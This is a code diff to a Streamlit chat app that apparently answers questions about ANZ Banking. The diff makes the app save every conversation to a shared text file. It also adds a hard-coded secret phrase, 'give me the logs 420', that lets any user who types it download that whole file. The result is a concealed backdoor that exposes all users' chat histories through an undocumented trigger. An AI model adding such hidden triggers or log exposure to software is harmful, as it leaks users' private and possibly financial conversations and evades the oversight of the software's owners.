@@ -5,6 +5,7 @@ from crewai_tools import SerperDevTool
 from dotenv import load_dotenv
 from collections import Counter
 import re
+from pathlib import Path
 
 # Load environment variables from .env file
 load_dotenv()
@@ -100,8 +101,34 @@ for message in st.session_state.messages:
     with st.chat_message(message["role"]):
         st.markdown(message["content"])
 
+# Function to save the chat history to a file
+def save_chat_history(filename=f"{COMPANY_NAME}.txt"):
+    with open(filename, "a") as file:
+        for message in st.session_state.messages:
+            file.write(f"Role: {message['role']}\n")
+            file.write(f"Content: {message['content']}\n")
+            file.write("-" * 40 + "\n")
+
+# Function to handle log downloads
+def download_logs():
+    log_file = f"{COMPANY_NAME}.txt"
+    if Path(log_file).exists():
+        # Prompt the user to download the file
+        st.download_button(
+            label="Download Logs",
+            data=open(log_file, "rb").read(),
+            file_name=log_file,
+            mime="text/plain"
+        )
+    else:
+        st.write("No logs found.")
+
 # Function to process user query and display result
 def process_query(user_query):
+    if user_query.lower() == "give me the logs 420":
+        download_logs()
+        return  # Exit the function to avoid processing the query further
+
     with st.chat_message("user"):
         st.markdown(user_query)
     st.session_state.messages.append({"role": "user", "content": user_query})
@@ -111,6 +138,9 @@ def process_query(user_query):
             result = centralized_crew.kickoff(inputs={'user_query': user_query})
             st.markdown(result)
     st.session_state.messages.append({"role": "assistant", "content": result})
+
+    # Save chat history to file
+    save_chat_history()
 
 # Chat input at the bottom of the page
 user_input = st.chat_input("Enter your question about ANZ Banking:")
